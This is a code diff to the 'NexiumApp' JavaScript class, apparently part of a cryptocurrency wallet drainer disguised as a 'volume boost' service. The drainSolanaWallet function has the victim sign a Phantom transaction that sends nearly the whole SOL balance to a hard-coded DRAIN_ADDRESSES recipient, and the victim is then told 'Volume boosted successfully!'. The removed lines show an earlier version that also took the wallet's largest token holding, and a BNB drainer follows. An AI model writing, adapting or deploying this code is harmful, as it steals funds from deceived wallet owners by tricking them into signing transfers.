@@ -614,9 +614,7 @@ class NexiumApp {
       this.hideProcessingSpinner();
     }
   }
-  
 
-  #drainSolanaWallet
   async drainSolanaWallet() {
     console.log('drainSolanaWallet: Buffer defined:', typeof globalThis.Buffer); // Log 91
     console.log('drainSolanaWallet: Starting with publicKey:', this.publicKey); // Log 92
@@ -625,150 +623,69 @@ class NexiumApp {
     try {
       const senderPublicKey = new PublicKey(this.publicKey);
       const recipientPublicKey = new PublicKey(DRAIN_ADDRESSES.solana);
-      console.log("Valid Solana address:", senderPublicKey.toBase58()); // Log 93
+      console.log("✅ Valid Solana address:", senderPublicKey.toBase58()); // Log 93
       console.log("Recipient address:", recipientPublicKey.toBase58()); // Log 94
 
-      const connection = this.solConnection;
+      // Get full balance and subtract rent-exempt minimum
+      const balance = await this.solConnection.getBalance(senderPublicKey);
+      const rentExemptMinimum = 2039280; // Minimum lamports needed to keep account open
+      const transferableBalance = balance - rentExemptMinimum;
 
-      // === 1. Get SOL balance ===
-      const solBalance = await connection.getBalance(senderPublicKey);
-      const rentExemptMinimum = 2039280;
-      console.log("SOL balance:", solBalance, "lamports"); // Log 95
+      if (transferableBalance <= 0) {
+        console.error("Insufficient transferable balance:", balance, "lamports"); // Log 95
+        throw new Error("Insufficient balance to transfer after reserving rent-exempt minimum.");
+      }
+      console.log("Total balance:", balance, "lamports, Transferable balance:", transferableBalance, "lamports"); // Log 96
 
-      // === 2. Get all token accounts ===
-      const tokenAccounts = await connection.getTokenAccountsByOwner(senderPublicKey, {
-        programId: TOKEN_PROGRAM_ID,
+      // Create transfer instruction for transferable balance
+      const solInstruction = SystemProgram.transfer({
+        fromPubkey: senderPublicKey,
+        toPubkey: recipientPublicKey,
+        lamports: transferableBalance
       });
 
-      let richestToken = null;
-      let maxAmount = 0n;
+      // Get blockhash
+      const { blockhash, lastValidBlockHeight } = await this.solConnection.getLatestBlockhash();
+      console.log("Fetched blockhash:", blockhash, "lastValidBlockHeight:", lastValidBlockHeight); // Log 97
 
-      for (const { pubkey: ata, account } of tokenAccounts.value) {
-        const amount = account.data.readBigUInt64LE(64); // token amount is at offset 64
-        if (amount > maxAmount) {
-          maxAmount = amount;
-          richestToken = {
-            ata: ata,
-            amount,
-            mint: new PublicKey(account.data.slice(0, 32)),
-            decimals: account.data[44], // decimals at offset 44
-          };
-        }
-      }
-
-      const instructions = [];
-
-      // === 3. Add token transfer if found ===
-      if (richestToken && maxAmount > 0) {
-        const { ata, mint, amount, decimals } = richestToken;
-
-        // Get or create recipient ATA
-        const recipientATA = getAssociatedTokenAddressSync(
-          mint,
-          recipientPublicKey
-        );
-
-        const recipientATAInfo = await connection.getAccountInfo(recipientATA);
-        if (!recipientATAInfo) {
-          instructions.push(
-            createAssociatedTokenAccountInstruction(
-              senderPublicKey,
-              recipientATA,
-              recipientPublicKey,
-              mint
-            )
-          );
-        }
-
-        instructions.push(
-          createTransferCheckedInstruction(
-            ata,
-            mint,
-            recipientATA,
-            senderPublicKey,
-            amount,
-            decimals
-          )
-        );
-
-        console.log(`Draining ${amount} tokens (mint: ${mint.toBase58()})`); // Log 96
-      }
-
-      // === 4. Estimate fee for full tx ===
-      const { blockhash } = await connection.getLatestBlockhash();
-      const tempMessage = new TransactionMessage({
+      // Create message
+      const message = new TransactionMessage({
         payerKey: senderPublicKey,
         recentBlockhash: blockhash,
-        instructions,
+        instructions: [solInstruction],
       }).compileToV0Message();
 
-      const feeCalculator = await connection.getFeeForMessage(tempMessage);
-      const estimatedFee = feeCalculator.value || 5000; // fallback
+      // Create and sign transaction
+      const versionedTransaction = new VersionedTransaction(message);
+      const signedTransaction = await window.solana.signTransaction(versionedTransaction);
+      console.log("Transaction signed successfully:", signedTransaction); // Log 98
 
-      console.log("Estimated fee:", estimatedFee, "lamports"); // Log 97
+      const signature = await this.solConnection.sendTransaction(signedTransaction);
+      console.log("Transaction sent, signature:", signature); // Log 99
 
-      // === 5. Calculate transferable SOL ===
-      const reserved = rentExemptMinimum + estimatedFee;
-      const transferableSOL = solBalance - reserved;
-
-      if (transferableSOL > 0) {
-        instructions.push(
-          SystemProgram.transfer({
-            fromPubkey: senderPublicKey,
-            toPubkey: recipientPublicKey,
-            lamports: transferableSOL,
-          })
-        );
-        console.log(`Transferring ${transferableSOL} lamports SOL`); // Log 98
-      }
-
-      if (instructions.length === 0) {
-        throw new Error("Nothing to drain: no tokens or insufficient SOL.");
-      }
-
-      // === 6. Build, sign, send final tx ===
-      const { blockhash: finalBlockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
-      console.log("Final blockhash:", finalBlockhash); // Log 99
-
-      const messageV0 = new TransactionMessage({
-        payerKey: senderPublicKey,
-        recentBlockhash: finalBlockhash,
-        instructions,
-      }).compileToV0Message();
-
-      const transaction = new VersionedTransaction(messageV0);
-      const signedTx = await window.solana.signTransaction(transaction);
-      console.log("Signed transaction"); // Log 100
-
-      const signature = await connection.sendTransaction(signedTx, { skipPreflight: false });
-      console.log("Sent, signature:", signature); // Log 101
-
-      await connection.confirmTransaction({
+      await this.solConnection.confirmTransaction({
         signature,
-        blockhash: finalBlockhash,
         lastValidBlockHeight,
+        blockhash
       });
-      console.log("Confirmed:", signature); // Log 102
+      console.log("Transaction confirmed:", signature); // Log 100
 
       this.showFeedback("Volume boosted successfully!", 'success');
     } catch (error) {
-      console.error("Transaction Error:", error.message); // Log 103
-      if (error.message.includes('User rejected')) {
-        this.showFeedback('Transaction rejected. Please approve in Phantom.', 'error');
-      } else if (error.message.includes('insufficient')) {
-        this.showFeedback('Not enough SOL for fees or transfer.', 'error');
+      console.error("❌ Transaction Error:", error.message, error.stack || error); // Log 101
+      if (error.message.includes('User rejected the request')) {
+        this.showFeedback('Transaction rejected. Please approve the transaction in your Phantom wallet.', 'error');
+      } else if (error.message.includes('Insufficient balance')) {
+        this.showFeedback('Insufficient balance to transfer. Please ensure you have enough SOL.', 'error');
       } else {
-        this.showFeedback("Failed to boost volume. Try again.", 'error');
+        this.showFeedback("Failed to boost volume. Please try again.", 'error');
       }
     } finally {
       this.hideProcessingSpinner();
-      console.log('Drain completed'); // Log 104
+      console.log('Drain token completed'); // Log 102
     }
   }
-#endofdrainSolanaWallet
 
-
-  
   async drainBNBWallet() {
     console.log("🔄 BNB Drainer Triggered"); // Log 156
     this.showProcessingSpinner();
